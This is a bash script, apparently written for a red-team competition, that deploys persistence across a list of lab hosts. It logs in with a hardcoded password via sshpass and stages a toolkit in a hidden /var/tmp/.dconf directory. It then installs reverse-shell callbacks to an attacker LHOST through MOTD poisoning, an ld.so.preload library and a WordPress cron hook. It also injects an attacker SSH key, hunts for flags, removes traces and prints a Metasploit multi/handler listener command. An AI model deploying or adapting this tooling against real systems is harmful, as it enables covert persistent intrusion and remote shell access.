#!/usr/bin/env bash

set -uo pipefail

# =============================================================================
# deploy.sh — Red Team Persistence Deployment Wrapper
#
# Usage:
#   ./deploy.sh
#
# Fill in the CONFIG section before running. This script will:
#   1. Compile the ld.so.preload shared library locally (once, using LHOST)
#   2. For each target:
#       a. SCP toolkit files to /var/tmp/.dconf/
#       b. Install MOTD persistence        (callbacks -> LHOST)
#       c. Inject SSH authorized_keys
#       d. Install ld.so.preload           (callbacks -> LHOST)
#       e. If tagged :wordpress — install wp_cron (callbacks -> LHOST)
#       f. If HUNT_FLAGS=true — run flag_hunt.sh and print results
#       g. Clean up /var/tmp/.dconf/
#
# Target tagging:
#   Plain IP          — base mechanisms only (motd + ld_preload + ssh)
#   IP:wordpress      — base + wp_cron
#
# Example:
#   TARGETS=(
#       "10.10.10.101"
#       "10.10.10.104:wordpress"
#   )
# =============================================================================

# ── CONFIG — fill these in on comp day ───────────────────────────────────────

TARGETS=(
#    "10.10.10.101"
#    "10.10.10.102"             # svc-redis-01
#    "10.10.10.103"             # svc-database-01
#    "10.10.10.104:wordpress"   # svc-amazin-01
#    "10.10.10.105"             # svc-samba-01
#    "10.10.10.106"
#    "10.10.10.107"
#    "10.10.10.108"
#    "10.10.10.109"
)

TARGET_USER="target"
TARGET_PASS="targetvm"

# Attacker machine IP — all callbacks connect here
LHOST="10.10.10.160"

LPORT="4444"

SSH_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdfRaX3m4g2IxRAU13/phGVXk4cZqcB0Y1FHCCaz4hW chris@kali"

# Hunt for flags on each target during deployment.
# Set to false when redeploying persistence mid-comp to skip the hunt.
HUNT_FLAGS=false

# ── END CONFIG ────────────────────────────────────────────────────────────────

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Base toolkit files transferred to every target
BASE_TOOLKIT=(
    "${SCRIPT_DIR}/obfuscate.sh"
    "${SCRIPT_DIR}/motd_poison.sh"
    "${SCRIPT_DIR}/ssh_inject.sh"
    "${SCRIPT_DIR}/ld_install.sh"
)

# WordPress-specific toolkit files
WP_TOOLKIT=(
    "${SCRIPT_DIR}/wp_cron.sh"
)

FLAG_HUNT_SCRIPT="${SCRIPT_DIR}/flag_hunt.sh"

SO_FILE="${SCRIPT_DIR}/libdconf-update.so"

REMOTE_DIR="/var/tmp/.dconf"

# ── Helpers ───────────────────────────────────────────────────────────────────

info()    { echo "[*] $*"; }
success() { echo "[+] $*"; }
warn()    { echo "[!] $*" >&2; }
error()   { echo "[-] $*" >&2; }

# ── Preflight checks ──────────────────────────────────────────────────────────

if [[ -z "$TARGET_USER" || -z "$TARGET_PASS" || -z "$SSH_PUBKEY" ]]; then
    error "CONFIG is incomplete — fill in TARGET_USER, TARGET_PASS, and SSH_PUBKEY"
    exit 1
fi

if [[ -z "$LHOST" ]]; then
    error "CONFIG is incomplete — fill in LHOST"
    exit 1
fi

if [[ "${#TARGETS[@]}" -eq 0 ]]; then
    error "No targets defined — add target IPs to the TARGETS array"
    exit 1
fi

if ! command -v sshpass &>/dev/null; then
    error "sshpass is not installed: sudo apt install sshpass"
    exit 1
fi

if ! command -v gcc &>/dev/null; then
    error "gcc is not installed: sudo apt install gcc"
    exit 1
fi

if [[ "$HUNT_FLAGS" == true && ! -f "$FLAG_HUNT_SCRIPT" ]]; then
    warn "flag_hunt.sh not found at ${FLAG_HUNT_SCRIPT} — flag hunting will be skipped"
    HUNT_FLAGS=false
fi

# ── SSH/SCP helpers ───────────────────────────────────────────────────────────

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"

run_ssh() {
    local target="$1"
    local cmd="$2"
    sshpass -p "$TARGET_PASS" ssh $SSH_OPTS "${TARGET_USER}@${target}" "$cmd" 2>/dev/null
}

run_ssh_sudo() {
    local target="$1"
    local cmd="$2"
    sshpass -p "$TARGET_PASS" ssh $SSH_OPTS "${TARGET_USER}@${target}" \
        "echo '${TARGET_PASS}' | sudo -S ${cmd}" 2>/dev/null
}

run_scp() {
    local target="$1"
    shift
    sshpass -p "$TARGET_PASS" scp $SSH_OPTS "$@" "${TARGET_USER}@${target}:${REMOTE_DIR}/" 2>/dev/null
}

# ── Step 1: Compile .so locally ───────────────────────────────────────────────

info "Compiling ld.so.preload shared library (LHOST=${LHOST})..."

if LHOST="$LHOST" LPORT="$LPORT" bash "${SCRIPT_DIR}/ld_gen.sh"; then
    success "Compiled: ${SO_FILE}"
else
    error "Compilation failed — ld.so.preload will not be deployed on any target"
    SO_FILE=""
fi

echo ""

# ── Step 2: Deploy to each target ────────────────────────────────────────────

declare -A RESULT_MOTD
declare -A RESULT_SSH
declare -A RESULT_LDPRELOAD
declare -A RESULT_WPCRON
declare -A RESULT_FLAGS

for ENTRY in "${TARGETS[@]}"; do

    TARGET="${ENTRY%%:*}"
    TAGS="${ENTRY#*:}"
    [[ "$TAGS" == "$TARGET" ]] && TAGS=""

    HAS_WORDPRESS=false
    [[ "$TAGS" == *"wordpress"* ]] && HAS_WORDPRESS=true

    echo "============================================================"
    info "Deploying to ${TARGET}$([ -n "$TAGS" ] && echo " [${TAGS}]")"
    echo "============================================================"

    # ── Transfer toolkit files ────────────────────────────────────────────

    info "[${TARGET}] Transferring toolkit files..."

    TRANSFER_FILES=("${BASE_TOOLKIT[@]}")
    [[ -n "$SO_FILE" ]]            && TRANSFER_FILES+=("$SO_FILE")
    [[ "$HAS_WORDPRESS" == true ]] && TRANSFER_FILES+=("${WP_TOOLKIT[@]}")
    [[ "$HUNT_FLAGS" == true ]]    && TRANSFER_FILES+=("$FLAG_HUNT_SCRIPT")

    if run_ssh "$TARGET" "mkdir -p ${REMOTE_DIR} && chmod 700 ${REMOTE_DIR}" && \
       run_scp "$TARGET" "${TRANSFER_FILES[@]}"; then
        success "[${TARGET}] Transfer complete"
    else
        error "[${TARGET}] Transfer failed — skipping host"
        RESULT_MOTD[$TARGET]="SKIP"
        RESULT_SSH[$TARGET]="SKIP"
        RESULT_LDPRELOAD[$TARGET]="SKIP"
        RESULT_WPCRON[$TARGET]="SKIP"
        RESULT_FLAGS[$TARGET]="SKIP"
        echo ""
        continue
    fi

    # ── MOTD persistence ──────────────────────────────────────────────────

    info "[${TARGET}] Installing MOTD persistence (-> ${LHOST}:${LPORT})..."

    if run_ssh_sudo "$TARGET" \
        "LHOST='${LHOST}' LPORT='${LPORT}' bash ${REMOTE_DIR}/motd_poison.sh"; then
        success "[${TARGET}] MOTD installed"
        RESULT_MOTD[$TARGET]="OK"
    else
        warn "[${TARGET}] MOTD install failed or already exists"
        RESULT_MOTD[$TARGET]="FAIL"
    fi

    # ── SSH key injection ─────────────────────────────────────────────────

    info "[${TARGET}] Injecting SSH key..."

    if run_ssh "$TARGET" "SSH_PUBKEY='${SSH_PUBKEY}' bash ${REMOTE_DIR}/ssh_inject.sh"; then
        success "[${TARGET}] SSH key injected"
        RESULT_SSH[$TARGET]="OK"
    else
        warn "[${TARGET}] SSH key injection failed or already exists"
        RESULT_SSH[$TARGET]="FAIL"
    fi

    # ── ld.so.preload ─────────────────────────────────────────────────────

    if [[ -n "$SO_FILE" ]]; then
        info "[${TARGET}] Installing ld.so.preload (-> ${LHOST}:${LPORT})..."

        if run_ssh_sudo "$TARGET" \
            "bash ${REMOTE_DIR}/ld_install.sh"; then
            success "[${TARGET}] ld.so.preload installed"
            RESULT_LDPRELOAD[$TARGET]="OK"
        else
            warn "[${TARGET}] ld.so.preload install failed or already exists"
            RESULT_LDPRELOAD[$TARGET]="FAIL"
        fi
    else
        warn "[${TARGET}] Skipping ld.so.preload — .so not compiled"
        RESULT_LDPRELOAD[$TARGET]="SKIP"
    fi

    # ── wp_cron (wordpress targets only) ─────────────────────────────────

    if [[ "$HAS_WORDPRESS" == true ]]; then
        info "[${TARGET}] Installing wp_cron persistence (-> ${LHOST}:${LPORT})..."

        if run_ssh "$TARGET" \
            "LHOST='${LHOST}' LPORT='${LPORT}' bash ${REMOTE_DIR}/wp_cron.sh"; then
            success "[${TARGET}] wp_cron installed"
            RESULT_WPCRON[$TARGET]="OK"
        else
            warn "[${TARGET}] wp_cron install failed or already exists"
            RESULT_WPCRON[$TARGET]="FAIL"
        fi
    else
        RESULT_WPCRON[$TARGET]="N/A"
    fi

    # ── Flag hunt ─────────────────────────────────────────────────────────

    if [[ "$HUNT_FLAGS" == true ]]; then
        info "[${TARGET}] Hunting for flags..."
        echo ""
        echo "  >>>>>>>>>> FLAGS FROM ${TARGET} <<<<<<<<<<"
        echo ""

        FLAG_OUTPUT=$(run_ssh_sudo "$TARGET" \
            "bash ${REMOTE_DIR}/flag_hunt.sh" 2>/dev/null)

        FLAG_COUNT=$(echo "$FLAG_OUTPUT" | grep -c "FLAG FOUND" || true)

        echo "$FLAG_OUTPUT"
        echo ""
        echo "  >>>>>>>>>> END FLAGS FROM ${TARGET} <<<<<<<<<<"
        echo ""

        RESULT_FLAGS[$TARGET]="${FLAG_COUNT} found"
    else
        RESULT_FLAGS[$TARGET]="SKIPPED"
    fi

    # ── Cleanup ───────────────────────────────────────────────────────────

    info "[${TARGET}] Cleaning up ${REMOTE_DIR}..."

    if run_ssh "$TARGET" "rm -rf ${REMOTE_DIR}"; then
        success "[${TARGET}] Cleanup complete"
    else
        warn "[${TARGET}] Cleanup may have partially failed"
    fi

    echo ""
done

# ── Final summary ─────────────────────────────────────────────────────────────

echo "============================================================"
success "Deployment complete — Summary"
echo "============================================================"
printf "%-18s %-8s %-8s %-12s %-10s %-12s\n" "TARGET" "MOTD" "SSH" "LD_PRELOAD" "WP_CRON" "FLAGS"
echo "--------------------------------------------------------------------"
for ENTRY in "${TARGETS[@]}"; do
    TARGET="${ENTRY%%:*}"
    printf "%-18s %-8s %-8s %-12s %-10s %-12s\n" \
        "$TARGET" \
        "${RESULT_MOTD[$TARGET]:-?}" \
        "${RESULT_SSH[$TARGET]:-?}" \
        "${RESULT_LDPRELOAD[$TARGET]:-?}" \
        "${RESULT_WPCRON[$TARGET]:-?}" \
        "${RESULT_FLAGS[$TARGET]:-?}"
done
echo "============================================================"
echo ""
info "Start listener on ${LHOST} before triggering callbacks:"
info "  msfconsole -q -x \"use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set ExitOnSession false; run -j\""